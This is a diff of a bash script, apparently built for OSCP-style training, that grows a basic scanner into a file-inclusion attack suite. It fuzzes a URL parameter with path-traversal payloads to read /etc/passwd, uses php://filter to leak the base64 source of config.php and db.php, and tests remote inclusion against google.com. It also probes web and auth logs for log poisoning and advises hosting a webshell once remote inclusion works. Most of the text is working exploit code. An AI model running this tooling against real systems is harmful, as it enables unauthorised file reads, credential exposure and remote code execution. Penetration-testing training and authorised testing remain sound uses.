@@ -1,147 +1,161 @@
 #!/bin/bash
 
-# Colors for pretty output
-GREEN='\033[0;32m'
-RED='\033[0;31m'
-YELLOW='\033[1;33m'
-NC='\033[0m' # No Color
+# ==============================================================================
+# Advanced OSCP LFI, RFI, Wrapper & Log Poisoning Suite
+# Wordlist: /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
+# ==============================================================================
 
+WORDLIST="/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt"
+
+# Help Function
 usage() {
-    echo -e "${YELLOW}Usage: $0 -u <target_url> [-p <port>] [-f <payloads_file>] [-o <output_file>]${NC}"
-    echo -e "  -u : Base URL with the parameter to test (e.g., 'http://example.com/page.php?file=')"
-    echo -e "  -p : Non-standard port (optional, e.g., '8080')"
-    echo -e "  -f : Path to a custom payloads file (optional)"
-    echo -e "  -o : Path to save text results output (optional)"
-    exit 1
+    echo "=============================================================================="
+    echo " OSCP Advanced LFI, RFI, Wrapper & Log Poisoning Suite"
+    echo "=============================================================================="
+    echo " Usage: $0 <URL_with_FUZZ>"
+    echo ""
+    echo " Arguments:"
+    echo "   URL_with_FUZZ   The vulnerable URL containing 'FUZZ' where the payload goes."
+    echo ""
+    echo " Options:"
+    echo "   -h, --help      Display this help message and exit"
+    echo ""
+    echo " Examples:"
+    echo "   $0 'http://10.10.10.X/vulnerable.php?page=FUZZ'"
+    echo "=============================================================================="
+    exit 0
 }
 
-# Ordered payloads array: RFI items placed strictly first
-DEFAULT_PAYLOADS=(
-    # --- RFI Payloads ---
-    "http://evt9769kiw9769.com" # Dummy domain to look for in response or blind traffic
-    "https://www.google.com"
-    # --- LFI Payloads ---
-    "../../../../../../../../etc/passwd"
-    "..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
-    "/etc/passwd"
-    "../../../../../../../../boot.ini"
-    "../../../../../../../../windows/win.ini"
-)
-
-# Initialize an array data structure to store positive results
-FINDINGS=()
-OUTPUT_FILE=""
-
-# Parse flags
-while getopts "u:p:f:o:" opt; do
-    case ${opt} in
-        u ) URL=$OPTARG ;;
-        p ) PORT=$OPTARG ;;
-        f ) PAYLOAD_FILE=$OPTARG ;;
-        o ) OUTPUT_FILE=$OPTARG ;;
-        * ) usage ;;
-    esac
-done
-
-if [ -z "$URL" ]; then
+# Check for -h or --help flags, or missing arguments
+if [[ "$#" -eq 0 || "$1" == "-h" || "$1" == "--help" ]]; then
     usage
 fi
 
-# Handle non-standard port injection into URL
-if [ ! -z "$PORT" ]; then
-    URL=$(echo "$URL" | sed 's/\/$//')
-    if [[ "$URL" =~ ^https?://[^/]+ ]]; then
-        BASE_MATCH="${BASH_REMATCH[0]}"
-        if [[ ! "$BASE_MATCH" =~ :[0-9]+$ ]]; then
-            URL="${URL/${BASE_MATCH}/${BASE_MATCH}:${PORT}}"
-        fi
+URL="$1"
+
+# Check if Seclists wordlist exists
+if [ ! -f "$WORDLIST" ]; then
+    echo "[-] Wordlist not found at $WORDLIST. Verify your SecLists installation."
+    exit 1
+fi
+
+echo "[+] Starting LFI and Vulnerability Suite on: $URL"
+echo "=================================================="
+
+# ------------------------------------------------------------------------------
+# 1. Standard LFI Fuzzing Loop (/etc/passwd)
+# ------------------------------------------------------------------------------
+echo "[+] Phase 1: Fuzzing for Local File Inclusion (LFI)..."
+while IFS= read -r payload; do
+    [[ -z "$payload" || "$payload" =~ ^# ]] && continue
+
+    if [[ "$URL" == *"FUZZ"* ]]; then
+        target="${URL//FUZZ/$payload}"
+    else
+        target="${URL}${payload}"
     fi
-fi
 
-# Load payloads
-SECLISTS_PATH="/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt"
-
-if [ ! -z "$PAYLOAD_FILE" ] && [ -f "$PAYLOAD_FILE" ]; then
-    mapfile -t PAYLOADS < "$PAYLOAD_FILE"
-elif [ -f "$SECLISTS_PATH" ]; then
-    RFI_BASE=(
-        "http://evt9769kiw9769.com"
-        "https://www.google.com"
-    )
-    mapfile -t SECLISTS_CONTENT < <(grep -v '^\s*#' "$SECLISTS_PATH" | grep -v '^\s*$')
-    PAYLOADS=("${RFI_BASE[@]}" "${SECLISTS_CONTENT[@]}")
-else
-    PAYLOADS=("${DEFAULT_PAYLOADS[@]}")
-fi
-
-echo -e "${GREEN}[+] Scanning target parameters silently...${NC}"
-
-# Run the scan
-for payload in "${PAYLOADS[@]}"; do
-    TARGET_URL="${URL}${payload}"
+    response=$(curl -s -L "$target")
     
-    # Send request quietly
-    RESPONSE=$(curl -s -w "\nHTTP_STATUS:%{http_code}" --connect-timeout 5 "$TARGET_URL")
-    STATUS_CODE=$(echo "$RESPONSE" | grep "HTTP_STATUS:" | awk -F':' '{print $2}')
-    BODY=$(echo "$RESPONSE" | sed '/HTTP_STATUS:/d')
+    if echo "$response" | grep -q "root:x:0:0:"; then
+        echo "[!] SUCCESS: LFI Detected!"
+        echo "    -> Payload: $payload"
+        echo "    -> Target URL: $target"
+        echo "--------------------------------------------------"
+    fi
+done < "$WORDLIST"
 
-    # Analyze response and push matching strings directly into the FINDINGS data structure
-    # 1. Linux LFI
-    if echo "$BODY" | grep -qE "root:[x*!]:0:0|daemon:[x*!]:|nobody:[x*!]:"; then
-        FINDINGS+=("${RED}[!!!] VULNERABLE (LFI) -> Found Linux system file content!\nURL: $TARGET_URL${NC}\n")
-        
-    # 2. Windows win.ini
-    elif echo "$BODY" | grep -qiE "\[fonts\]|\[extensions\]|\[mci extensions\]"; then
-        FINDINGS+=("${RED}[!!!] VULNERABLE (LFI) -> Found Windows win.ini content!\nURL: $TARGET_URL${NC}\n")
+echo "[+] Phase 1 Complete."
+echo "=================================================="
 
-    # 3. Windows boot.ini
-    elif echo "$BODY" | grep -qiE "\[boot loader\]|\[operating systems\]|multi\(0\)disk\(0\)"; then
-        FINDINGS+=("${RED}[!!!] VULNERABLE (LFI) -> Found Windows boot.ini content!\nURL: $TARGET_URL${NC}\n")
+# ------------------------------------------------------------------------------
+# 2. PHP Wrapper Testing (php://filter source code disclosure)
+# ------------------------------------------------------------------------------
+echo "[+] Phase 2: Testing PHP Wrappers (php://filter)..."
 
-    # 4. Hosts file leak
-    elif echo "$BODY" | grep -qE "127\.0\.0\.1\s+localhost"; then
-        FINDINGS+=("${RED}[!!!] VULNERABLE (LFI) -> Found hosts file content!\nURL: $TARGET_URL${NC}\n")
-        
-    # 5. RFI
-    elif echo "$BODY" | grep -iq "<title>Google</title>" || echo "$BODY" | grep -q "google.com/brand-elements"; then
-        FINDINGS+=("${RED}[!!!] VULNERABLE (RFI) -> Found Google landing page content!\nURL: $TARGET_URL${NC}\n")
-        
-    # 6. Fallback Status 200 OK
-    elif [ "$STATUS_CODE" == "200" ]; then
-        FINDINGS+=("${YELLOW}[?] Potential Hit -> Status 200 OK (Manual verification required)\nURL: $TARGET_URL${NC}\n")
+WRAPPER_FILES=("index.php" "config.php" "login.php" "db.php")
+
+for file in "${WRAPPER_FILES[@]}"; do
+    wrapper_payload="php://filter/convert.base64-encode/resource=$file"
+    
+    if [[ "$URL" == *"FUZZ"* ]]; then
+        w_target="${URL//FUZZ/$wrapper_payload}"
+    else
+        w_target="${URL}${wrapper_payload}"
+    fi
+    
+    w_resp=$(curl -s -L "$w_target")
+    
+    if [[ ${#w_resp} -gt 50 ]] && [[ "$w_resp" =~ ^[a-zA-Z0-9+/=]+$ ]]; then
+        echo "[!] SUCCESS: Wrapper Source Code Disclosure Found!"
+        echo "    -> File Target: $file"
+        echo "    -> Target URL: $w_target"
+        echo "    -> Base64 Output Snippet: ${w_resp:0:60}..."
+        echo "    -> Decode with: echo '<base64>' | base64 -d"
+        echo "--------------------------------------------------"
     fi
 done
 
-# Output summary presentation at the end
-echo -e "\n${GREEN}[+] Scan processing completed.${NC}"
-echo -e "=================================================================\n"
+echo "[+] Phase 2 Complete."
+echo "=================================================="
 
-if [ ${#FINDINGS[@]} -eq 0 ]; then
-    echo -e "${YELLOW}[-] No positive findings or anomalies discovered.${NC}"
-    if [ ! -z "$OUTPUT_FILE" ]; then
-        echo -e "Scan target: $URL\nNo positive findings or anomalies discovered." > "$OUTPUT_FILE"
-        echo -e "${GREEN}[+] Summary logged to $OUTPUT_FILE${NC}"
-    fi
+# ------------------------------------------------------------------------------
+# 3. Remote File Inclusion (RFI) Testing (External URL fetch check)
+# ------------------------------------------------------------------------------
+echo "[+] Phase 3: Testing Remote File Inclusion (RFI)..."
+
+RFI_TEST_URL="https://www.google.com"
+
+if [[ "$URL" == *"FUZZ"* ]]; then
+    rfi_target="${URL//FUZZ/$RFI_TEST_URL}"
 else
-    echo -e "${GREEN}[+] Positive findings tracked during execution:${NC}\n"
-    
-    # Prepare output file headers if specified
-    if [ ! -z "$OUTPUT_FILE" ]; then
-        echo -e "Scan target: $URL\nPositive findings tracked during execution:\n" > "$OUTPUT_FILE"
-    fi
-
-    # Iterate through the captured data structure items
-    for result in "${FINDINGS[@]}"; do
-        # Print to terminal with colors
-        echo -e "$result"
-        
-        # Write to file if option used (using sed to strip out shell color codes)
-        if [ ! -z "$OUTPUT_FILE" ]; then
-            echo -e "$result" | sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" >> "$OUTPUT_FILE"
-        fi
-    done
-
-    if [ ! -z "$OUTPUT_FILE" ]; then
-        echo -e "${GREEN}[+] Clean text results saved to: $OUTPUT_FILE${NC}"
-    fi
+    rfi_target="${URL}${RFI_TEST_URL}"
 fi
+
+echo "[*] Testing if target fetches external content from: $RFI_TEST_URL"
+rfi_resp=$(curl -s -L "$rfi_target")
+
+# Look for characteristic Google indicators or generic successful HTML return length
+if echo "$rfi_resp" | grep -q -E "Google|<html|<!DOCTYPE html>"; then
+    echo "[!] CRITICAL SUCCESS: RFI / External URL Inclusion Detected!"
+    echo "    -> Target URL: $rfi_target"
+    echo "    -> Action: The application successfully fetched an external webpage. Host your own webshell on your machine and pass it to the parameter!"
+    echo "--------------------------------------------------"
+else
+    echo "[-] RFI check failed (allow_url_include / allow_url_fopen is likely Off)."
+fi
+
+echo "[+] Phase 3 Complete."
+echo "=================================================="
+
+# ------------------------------------------------------------------------------
+# 4. Log Poisoning Probes
+# ------------------------------------------------------------------------------
+echo "[+] Phase 4: Probing for Common Log Files (Log Poisoning Vectors)..."
+
+LOG_PATHS=(
+    "/var/log/apache2/access.log"
+    "/var/log/apache/access.log"
+    "/var/log/httpd/access_log"
+    "/var/log/nginx/access.log"
+    "/var/log/auth.log"
+    "/var/log/vsftpd.log"
+)
+
+for log in "${LOG_PATHS[@]}"; do
+    if [[ "$URL" == *"FUZZ"* ]]; then
+        log_target="${URL//FUZZ/$log}"
+    else
+        log_target="${URL}${log}"
+    fi
+    
+    log_resp=$(curl -s -L "$log_target")
+    
+    if echo "$log_resp" | grep -q -E "HTTP/1\.[01]\" 200|invalid user|pam_unix"; then
+        echo "[!] ACCESSIBLE LOG FOUND: $log"
+        echo "    -> Target URL: $log_target"
+        echo "--------------------------------------------------"
+    fi
+done
+
+echo "[+] Scan finished completely. Good luck"
